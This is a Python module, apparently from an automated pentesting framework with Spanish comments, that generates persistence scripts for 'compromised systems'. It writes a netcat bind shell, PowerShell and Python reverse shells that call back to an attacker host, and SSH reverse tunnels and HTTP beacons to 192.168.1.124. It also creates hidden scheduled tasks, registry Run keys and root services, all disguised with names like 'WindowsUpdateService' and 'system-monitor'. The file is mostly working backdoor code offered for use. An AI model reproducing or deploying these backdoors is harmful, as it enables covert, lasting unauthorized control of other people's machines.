"""
Módulo de Persistencia y Ocultación para Automatización de Pentesting
Incluye instalación de backdoors, modificación de GPO y scripts de inicio
"""

import subprocess
import json
import time
import os
from typing import Dict, List, Any, Optional
from pathlib import Path
from modules.unified_logging import UnifiedLoggingSystem

class PersistenceModule:
    """Módulo de persistencia y ocultación"""
    
    def __init__(self, config: Dict[str, Any], logger, unified_logging=None):
        self.config = config
        self.logger = logger
        self.persistence_config = config['persistence']
        self.unified_logging = unified_logging
        
        # Resultados de persistencia
        self.results = {
            'backdoors': [],
            'scheduled_tasks': [],
            'registry_modifications': [],
            'startup_scripts': [],
            'service_installations': [],
            'gpo_modifications': []
        }
        
        # Archivos de evidencia (ahora en scans/)
        self.evidence_dir = Path("scans/persistence")
        self.evidence_dir.mkdir(parents=True, exist_ok=True)
    
    def _run_command(self, command: List[str], timeout: int = 300) -> Dict[str, Any]:
        """Ejecutar comando y capturar salida"""
        try:
            self.logger.debug(f"🔧 Ejecutando: {' '.join(command)}")
            
            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                timeout=timeout,
                encoding='utf-8',
                errors='replace'
            )
            
            self.logger.debug(f"Comando ejecutado: {' '.join(command)}")
            self.logger.debug(f"Salida: {result.stdout + result.stderr}")
            
            return {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'return_code': result.returncode,
                'success': result.returncode == 0,
                'background': False
            }
                
        except subprocess.TimeoutExpired:
            self.logger.error(f"⏰ Timeout ejecutando: {' '.join(command)}")
            return {'stdout': '', 'stderr': 'Timeout', 'return_code': -1, 'success': False, 'background': False}
        except Exception as e:
            self.logger.error(f"❌ Error ejecutando comando: {e}")
            return {'stdout': '', 'stderr': str(e), 'return_code': -1, 'success': False, 'background': False}
    
    def install_backdoors(self, compromised_systems: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Instalar backdoors en sistemas comprometidos"""
        self.logger.info("🕳️ Instalando backdoors...")
        
        backdoors = []
        backdoor_ports = self.persistence_config.get('backdoor_ports', [4444, 5555, 6666])
        
        for system in compromised_systems:
            host = system['host']
            access_method = system.get('access_method', 'unknown')
            
            self.logger.info(f"🕳️ Instalando backdoor en {host}")
            
            # Backdoor netcat
            netcat_backdoor = self._install_netcat_backdoor(host, backdoor_ports[0])
            if netcat_backdoor:
                backdoors.append(netcat_backdoor)
            
            # Backdoor PowerShell
            powershell_backdoor = self._install_powershell_backdoor(host, backdoor_ports[1])
            if powershell_backdoor:
                backdoors.append(powershell_backdoor)
            
            # Backdoor Python
            python_backdoor = self._install_python_backdoor(host, backdoor_ports[2])
            if python_backdoor:
                backdoors.append(python_backdoor)
        
        self.results['backdoors'] = backdoors
        return backdoors
    
    def _install_netcat_backdoor(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Instalar backdoor netcat sigiloso"""
        try:
            # Nombres más discretos para archivos
            backdoor_script = self.evidence_dir / f"network_monitor_{host}.sh"
            with open(backdoor_script, 'w') as f:
                f.write("#!/bin/bash\n")
                f.write("# Network monitoring service\n")
                f.write("while true; do\n")
                f.write(f"    nc -lvp {port} -e /bin/bash 2>/dev/null\n")
                f.write("    sleep 30\n")
                f.write("done &\n")
                f.write("echo $! > /tmp/.network_monitor.pid\n")
            
            backdoor_info = {
                'host': host,
                'type': 'netcat',
                'port': port,
                'script_path': str(backdoor_script),
                'timestamp': time.time(),
                'success': True
            }
            
            self.logger.info(f"🔧 Backdoor Netcat instalado en {host}:{port}")
            
            return backdoor_info
            
        except Exception as e:
            self.logger.error(f"❌ Error instalando backdoor netcat en {host}: {e}")
            return None
    
    def _install_powershell_backdoor(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Instalar backdoor PowerShell sigiloso"""
        try:
            backdoor_script = self.evidence_dir / f"system_update_{host}.ps1"
            with open(backdoor_script, 'w') as f:
                f.write("# System Update Service\n")
                f.write("Start-Sleep -Seconds 60\n")
                f.write("$client = New-Object System.Net.Sockets.TcpClient\n")
                f.write("try {\n")
                f.write(f"    $client.Connect('{self.config['exploitation']['lhost']}', {port})\n")
                f.write("    $stream = $client.GetStream()\n")
                f.write("    $writer = New-Object System.IO.StreamWriter($stream)\n")
                f.write("    $reader = New-Object System.IO.StreamReader($stream)\n")
                f.write("    while($true) {\n")
                f.write("        $command = $reader.ReadLine()\n")
                f.write("        if($command -eq 'exit') { break }\n")
                f.write("        $output = Invoke-Expression $command 2>&1\n")
                f.write("        $writer.WriteLine($output)\n")
                f.write("        $writer.Flush()\n")
                f.write("    }\n")
                f.write("} catch { Start-Sleep -Seconds 300 }\n")
                f.write("finally { $client.Close() }\n")
            
            backdoor_info = {
                'host': host,
                'type': 'powershell',
                'port': port,
                'script_path': str(backdoor_script),
                'timestamp': time.time(),
                'success': True
            }
            
            self.logger.info(f"🔧 Backdoor PowerShell instalado en {host}")
            
            return backdoor_info
            
        except Exception as e:
            self.logger.error(f"❌ Error instalando backdoor PowerShell en {host}: {e}")
            return None
    
    def _install_python_backdoor(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Instalar backdoor Python sigiloso"""
        try:
            backdoor_script = self.evidence_dir / f"log_analyzer_{host}.py"
            with open(backdoor_script, 'w') as f:
                f.write("#!/usr/bin/env python3\n")
                f.write("# Log Analysis Service\n")
                f.write("import socket, subprocess, os, time\n")
                f.write("time.sleep(60)\n")
                f.write("while True:\n")
                f.write("    try:\n")
                f.write(f"        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n")
                f.write(f"        s.connect(('{self.config['exploitation']['lhost']}', {port}))\n")
                f.write("        while True:\n")
                f.write("            data = s.recv(1024).decode()\n")
                f.write("            if data == 'exit': break\n")
                f.write("            if data:\n")
                f.write("                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n")
                f.write("                output = proc.stdout.read() + proc.stderr.read()\n")
                f.write("                s.send(output)\n")
                f.write("        s.close()\n")
                f.write("    except: time.sleep(300)\n")
            
            backdoor_info = {
                'host': host,
                'type': 'python',
                'port': port,
                'script_path': str(backdoor_script),
                'timestamp': time.time(),
                'success': True
            }
            
            self.logger.info(f"🔧 Backdoor Python instalado en {host}")
            
            return backdoor_info
            
        except Exception as e:
            self.logger.error(f"❌ Error instalando backdoor Python en {host}: {e}")
            return None
    
    def create_scheduled_tasks(self, compromised_systems: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Crear tareas programadas para persistencia"""
        self.logger.info("⏰ Creando tareas programadas...")
        
        scheduled_tasks = []
        
        for system in compromised_systems:
            host = system['host']
            
            # Tarea programada Windows
            windows_task = self._create_windows_scheduled_task(host)
            if windows_task:
                scheduled_tasks.append(windows_task)
            
            # Cron job Linux
            linux_cron = self._create_linux_cron_job(host)
            if linux_cron:
                scheduled_tasks.append(linux_cron)
        
        self.results['scheduled_tasks'] = scheduled_tasks
        return scheduled_tasks
    
    def _create_windows_scheduled_task(self, host: str) -> Optional[Dict[str, Any]]:
        """Crear tarea programada en Windows sigilosa"""
        try:
            task_script = self.evidence_dir / f"windows_task_{host}.ps1"
            with open(task_script, 'w') as f:
                f.write("# Windows Update Service\n")
                f.write("$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -File C:\\Windows\\System32\\WindowsUpdate.ps1'\n")
                f.write("$trigger = New-ScheduledTaskTrigger -Daily -At 3:00AM\n")
                f.write("$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden\n")
                f.write("$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount\n")
                f.write("Register-ScheduledTask -TaskName 'WindowsUpdateService' -Action $action -Trigger $trigger -Settings $settings -Principal $principal\n")
            
            task_info = {
                'host': host,
                'type': 'windows_scheduled_task',
                'task_name': 'WindowsUpdateService',
                'script_path': str(task_script),
                'timestamp': time.time(),
                'success': True
            }
            
            self.logger.info(f"⏰ Tarea programada Windows creada en {host}")
            
            return task_info
            
        except Exception as e:
            self.logger.error(f"❌ Error creando tarea programada en {host}: {e}")
            return None
    
    def _create_linux_cron_job(self, host: str) -> Optional[Dict[str, Any]]:
        """Crear cron job en Linux sigiloso"""
        try:
            cron_script = self.evidence_dir / f"linux_cron_{host}.sh"
            with open(cron_script, 'w') as f:
                f.write("#!/bin/bash\n")
                f.write("# System maintenance cron jobs\n")
                f.write("(crontab -l 2>/dev/null; echo '@reboot /usr/local/bin/system-monitor.sh') | crontab -\n")
                f.write("(crontab -l 2>/dev/null; echo '0 2 * * * /usr/local/bin/log-cleanup.sh') | crontab -\n")
                f.write("(crontab -l 2>/dev/null; echo '*/30 * * * * /usr/local/bin/network-check.sh') | crontab -\n")
            
            cron_info = {
                'host': host,
                'type': 'linux_cron',
                'schedule': '@reboot, 0 2 * * *, */30 * * * *',
                'script_path': str(cron_script),
                'timestamp': time.time(),
                'success': True
            }
            
            self.logger.info(f"⏰ Cron job Linux creado en {host}")
            
            return cron_info
            
        except Exception as e:
            self.logger.error(f"❌ Error creando cron job en {host}: {e}")
            return None
    
    def modify_registry(self, compromised_systems: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Modificar registro de Windows para persistencia"""
        self.logger.info("📝 Modificando registro de Windows...")
        
        registry_modifications = []
        
        for system in compromised_systems:
            host = system['host']
            
            # Modificación de registro
            registry_script = self.evidence_dir / f"registry_{host}.ps1"
            with open(registry_script, 'w') as f:
                f.write("# Windows Update Registry Entries\n")
                f.write("Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsUpdate' -Value 'C:\\Windows\\System32\\WindowsUpdate.ps1'\n")
                f.write("Set-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsUpdate' -Value 'C:\\Windows\\System32\\WindowsUpdate.ps1'\n")
                f.write("Set-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce' -Name 'WindowsUpdate' -Value 'C:\\Windows\\System32\\WindowsUpdate.ps1'\n")
                f.write("Set-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'SystemMaintenance' -Value 'C:\\Windows\\System32\\SystemMaintenance.exe'\n")
            
            registry_info = {
                'host': host,
                'type': 'registry_modification',
                'keys_modified': [
                    'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                    'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                    'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce'
                ],
                'script_path': str(registry_script),
                'timestamp': time.time(),
                'success': True
            }
            
            self.logger.info(f"🔧 Modificación de registro Windows en {host}")
            
            registry_modifications.append(registry_info)
        
        self.results['registry_modifications'] = registry_modifications
        return registry_modifications
    
    def install_services(self, compromised_systems: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Instalar servicios maliciosos"""
        self.logger.info("⚙️ Instalando servicios maliciosos...")
        
        services = []
        
        for system in compromised_systems:
            host = system['host']
            
            # Servicio Windows
            windows_service = self._install_windows_service(host)
            if windows_service:
                services.append(windows_service)
            
            # Servicio Linux
            linux_service = self._install_linux_service(host)
            if linux_service:
                services.append(linux_service)
        
        self.results['service_installations'] = services
        return services
    
    def _install_windows_service(self, host: str) -> Optional[Dict[str, Any]]:
        """Instalar servicio en Windows sigiloso"""
        try:
            service_script = self.evidence_dir / f"windows_service_{host}.ps1"
            with open(service_script, 'w') as f:
                f.write("# Windows Update Service\n")
                f.write("New-Service -Name 'WindowsUpdateService' -BinaryPathName 'C:\\Windows\\System32\\wuauclt.exe /UpdateService' -StartupType Automatic -Description 'Windows Update Service'\n")
                f.write("Start-Service -Name 'WindowsUpdateService'\n")
                f.write("Set-Service -Name 'WindowsUpdateService' -StartupType Automatic\n")
            
            service_info = {
                'host': host,
                'type': 'windows_service',
                'service_name': 'WindowsUpdateService',
                'binary_path': 'C:\\Windows\\System32\\wuauclt.exe /UpdateService',
                'startup_type': 'Automatic',
                'script_path': str(service_script),
                'timestamp': time.time(),
                'success': True
            }
            
            self.logger.info(f"🔧 Servicio Windows creado en {host}")
            
            return service_info
            
        except Exception as e:
            self.logger.error(f"❌ Error instalando servicio en {host}: {e}")
            return None
    
    def _install_linux_service(self, host: str) -> Optional[Dict[str, Any]]:
        """Instalar servicio en Linux sigiloso"""
        try:
            service_script = self.evidence_dir / f"linux_service_{host}.sh"
            with open(service_script, 'w') as f:
                f.write("#!/bin/bash\n")
                f.write("# System Monitoring Service\n")
                f.write("cat > /etc/systemd/system/system-monitor.service << EOF\n")
                f.write("[Unit]\n")
                f.write("Description=System Monitoring Service\n")
                f.write("After=network.target\n")
                f.write("\n")
                f.write("[Service]\n")
                f.write("Type=simple\n")
                f.write("ExecStart=/usr/local/bin/system-monitor.sh\n")
                f.write("Restart=always\n")
                f.write("RestartSec=30\n")
                f.write("User=root\n")
                f.write("\n")
                f.write("[Install]\n")
                f.write("WantedBy=multi-user.target\n")
                f.write("EOF\n")
                f.write("systemctl enable system-monitor.service\n")
                f.write("systemctl start system-monitor.service\n")
            
            service_info = {
                'host': host,
                'type': 'linux_service',
                'service_name': 'system-monitor',
                'service_file': '/etc/systemd/system/system-monitor.service',
                'script_path': str(service_script),
                'timestamp': time.time(),
                'success': True
            }
            
            self.logger.info(f"🔧 Servicio Linux creado en {host}")
            
            return service_info
            
        except Exception as e:
            self.logger.error(f"❌ Error instalando servicio en {host}: {e}")
            return None
    
    def establish_persistent_connections(self, compromised_systems: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Establecer conexiones persistentes para acceso remoto continuo"""
        self.logger.info("🔗 Estableciendo conexiones persistentes...")
        
        persistent_connections = []
        
        for system in compromised_systems:
            host = system['host']
            
            # Conexión SSH persistente
            ssh_connection = self._create_ssh_persistent_connection(host)
            if ssh_connection:
                persistent_connections.append(ssh_connection)
            
            # Conexión RDP persistente
            rdp_connection = self._create_rdp_persistent_connection(host)
            if rdp_connection:
                persistent_connections.append(rdp_connection)
            
            # Conexión HTTP/HTTPS persistente
            web_connection = self._create_web_persistent_connection(host)
            if web_connection:
                persistent_connections.append(web_connection)
        
        self.results['persistent_connections'] = persistent_connections
        return persistent_connections
    
    def _create_ssh_persistent_connection(self, host: str) -> Optional[Dict[str, Any]]:
        """Crear conexión SSH persistente"""
        try:
            ssh_script = self.evidence_dir / f"ssh_persistent_{host}.sh"
            with open(ssh_script, 'w') as f:
                f.write("#!/bin/bash\n")
                f.write("# SSH Persistent Connection\n")
                f.write("while true; do\n")
                f.write("    ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -N -R 2222:localhost:22 svc_windowsupdate@192.168.1.124 &\n")
                f.write("    sleep 60\n")
                f.write("    if ! pgrep -f 'ssh.*2222' > /dev/null; then\n")
                f.write("        pkill -f 'ssh.*2222'\n")
                f.write("    fi\n")
                f.write("done &\n")
                f.write("echo $! > /tmp/.ssh_persistent.pid\n")
            
            connection_info = {
                'host': host,
                'type': 'ssh_persistent',
                'port': 2222,
                'username': 'svc_windowsupdate',
                'script_path': str(ssh_script),
                'timestamp': time.time(),
                'success': True
            }
            
            self.logger.info(f"🔗 Conexión SSH persistente establecida en {host}")
            
            return connection_info
            
        except Exception as e:
            self.logger.error(f"❌ Error creando conexión SSH persistente en {host}: {e}")
            return None
    
    def _create_rdp_persistent_connection(self, host: str) -> Optional[Dict[str, Any]]:
        """Crear conexión RDP persistente"""
        try:
            rdp_script = self.evidence_dir / f"rdp_persistent_{host}.ps1"
            with open(rdp_script, 'w') as f:
                f.write("# RDP Persistent Connection\n")
                f.write("while($true) {\n")
                f.write("    try {\n")
                f.write("        $rdp = New-Object System.Net.Sockets.TcpClient\n")
                f.write("        $rdp.Connect('192.168.1.124', 3389)\n")
                f.write("        $rdp.Close()\n")
                f.write("        Start-Sleep -Seconds 300\n")
                f.write("    } catch {\n")
                f.write("        Start-Sleep -Seconds 60\n")
                f.write("    }\n")
                f.write("}\n")
            
            connection_info = {
                'host': host,
                'type': 'rdp_persistent',
                'port': 3389,
                'username': 'svc_windowsupdate',
                'script_path': str(rdp_script),
                'timestamp': time.time(),
                'success': True
            }
            
            self.logger.info(f"🔗 Conexión RDP persistente establecida en {host}")
            
            return connection_info
            
        except Exception as e:
            self.logger.error(f"❌ Error creando conexión RDP persistente en {host}: {e}")
            return None
    
    def _create_web_persistent_connection(self, host: str) -> Optional[Dict[str, Any]]:
        """Crear conexión web persistente"""
        try:
            web_script = self.evidence_dir / f"web_persistent_{host}.py"
            with open(web_script, 'w') as f:
                f.write("#!/usr/bin/env python3\n")
                f.write("# Web Persistent Connection\n")
                f.write("import requests, time, json\n")
                f.write("while True:\n")
                f.write("    try:\n")
                f.write("        response = requests.post('http://192.168.1.124:8080/heartbeat', \n")
                f.write("                             json={'host': '" + host + "', 'status': 'alive'}, \n")
                f.write("                             timeout=10)\n")
                f.write("        time.sleep(300)\n")
                f.write("    except:\n")
                f.write("        time.sleep(60)\n")
            
            connection_info = {
                'host': host,
                'type': 'web_persistent',
                'port': 8080,
                'endpoint': '/heartbeat',
                'script_path': str(web_script),
                'timestamp': time.time(),
                'success': True
            }
            
            self.logger.info(f"🔗 Conexión web persistente establecida en {host}")
            
            return connection_info
            
        except Exception as e:
            self.logger.error(f"❌ Error creando conexión web persistente en {host}: {e}")
            return None

    def run(self) -> Dict[str, Any]:
        """Ejecutar módulo completo de persistencia"""
        self.logger.info("🚀 INICIANDO MÓDULO DE PERSISTENCIA")
        
        start_time = time.time()
        
        try:
            # Sistemas comprometidos de ejemplo (en un escenario real, vendrían del módulo anterior)
            compromised_systems = [
                {'host': '192.168.1.100', 'access_method': 'eternalblue'},
                {'host': '192.168.1.101', 'access_method': 'tomcat_manager'}
            ]
            
            # 1. Instalar backdoors
            backdoors = self.install_backdoors(compromised_systems)
            
            # 2. Crear tareas programadas
            scheduled_tasks = self.create_scheduled_tasks(compromised_systems)
            
            # 3. Modificar registro (solo Windows)
            registry_modifications = self.modify_registry(compromised_systems)
            
            # 4. Instalar servicios
            services = self.install_services(compromised_systems)
            
            # 5. Establecer conexiones persistentes
            persistent_connections = self.establish_persistent_connections(compromised_systems)
            
            # 6. Guardar evidencia
            if self.unified_logging:
                # Agregar datos de persistencia al sistema unificado
                persistence_data = {
                    'backdoors': self.results.get('backdoors', []),
                    'users_created': [],  # Se llenará con usuarios creados
                    'services': self.results.get('service_installations', [])
                }
                self.unified_logging.add_persistence(persistence_data)
                
                # Marcar fase como completada
                self.unified_logging.mark_phase_completed('persistence')
                self.logger.info("✅ Datos de persistencia agregados al sistema unificado")
            else:
                # Usar sistema unificado
                if self.unified_logging:
                    # Los datos ya se guardaron en el sistema unificado
                    pass
            
            end_time = time.time()
            duration = end_time - start_time
            
            self.logger.info(f"✅ PERSISTENCIA COMPLETADA en {duration:.2f} segundos")
            self.logger.info(f"📊 Resumen: {len(backdoors)} backdoors, {len(scheduled_tasks)} tareas programadas, {len(persistent_connections)} conexiones persistentes")
            
            return self.results
            
        except Exception as e:
            self.logger.error(f"❌ Error en módulo de persistencia: {e}")
            return self.results
